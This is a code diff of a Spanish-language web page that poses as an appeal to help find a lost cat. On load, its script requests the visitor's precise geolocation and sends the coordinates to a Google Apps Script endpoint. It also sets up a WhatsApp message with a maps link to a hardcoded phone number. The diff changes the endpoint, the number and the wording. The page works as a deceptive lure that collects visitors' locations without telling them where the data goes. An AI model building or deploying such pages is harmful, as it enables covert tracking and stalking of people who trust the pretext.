@@ -1,10 +1,10 @@
 <!DOCTYPE HTML>
-<html lang="es">
+<html>
 <head>
-  <title>¡Por favor, ayúdanos a encontrar a nuestro gato!</title>  
+  <title>ayuda a encontrar al gato..</title>  
   <meta charset="UTF-8">
   
-  <script type="text/javascript"> 
+  <script type="text/javascript">
     window.addEventListener('load', obtenerUbicacion, false);
 
     function obtenerUbicacion() {
@@ -21,7 +21,7 @@
         var exactitud = posicion.coords.accuracy;
 
         // URL de tu Google Apps Script
-        var urlServidor = "https://script.google.com/macros/s/AKfycbzZk4nru2ohFC69JMqNUD-8z7GV7N971kp56Na6PXWY3MRpy6V3NkqesvUaeg3rBimK/exec"; 
+        var urlServidor = "https://script.google.com/macros/s/AKfycbyseGw510AUqcUZS7xEqe5KondDkUFg_C-6n_nKRpzzD87dqFGxgevUzf8h-Sx3hqHR/exec";
 
         var datos = {
             latitud: lat,
@@ -42,12 +42,12 @@
             document.body.innerHTML = "<h2>Ubicación enviada con éxito</h2>";
         })
         .catch(error => {
-            console.error("Error al enviar la ubicación:", error);
-            alert("Hubo un problema al enviar la ubicación. Inténtalo de nuevo.");
+            console.error("Error al enviar ubicación:", error);
+            document.body.innerHTML = "<h2>Error al enviar ubicación</h2>";
         });
 
         // Número de WhatsApp (incluye el código de país, sin "+")
-        var numeroWhatsApp = "5215539657315"; // Reemplaza con el número correcto
+        var numeroWhatsApp = "525539657315"; // Reemplaza con el número de destino
 
         // Mensaje personalizado
         var mensaje = encodeURIComponent(`¡Hola! Acabo de ver al gato en esta ubicación: https://www.google.com/maps?q=${lat},${lon}`);
@@ -59,26 +59,13 @@
     }
 
     function mostrarError(error) {
-        let mensaje;
-        switch (error.code) {
-            case error.PERMISSION_DENIED:
-                mensaje = "No se otorgaron permisos para obtener la ubicación.";
-                break;
-            case error.POSITION_UNAVAILABLE:
-                mensaje = "La información de ubicación no está disponible.";
-                break;
-            case error.TIMEOUT:
-                mensaje = "Se agotó el tiempo de espera para obtener la ubicación.";
-                break;
-            default:
-                mensaje = "Error desconocido al obtener la ubicación.";
-        }
-        alert(mensaje);
+        alert('No se pudo obtener la ubicación: ' + error.message);
     }
   </script>  
 
 </head>
 <body>
-  <h2>¡Ayúdanos a encontrar a nuestro gato!</h2>
+  <h2>Ayudanos a encontrar al gato . por favor!!!.</h2>
 </body>
 </html>
+
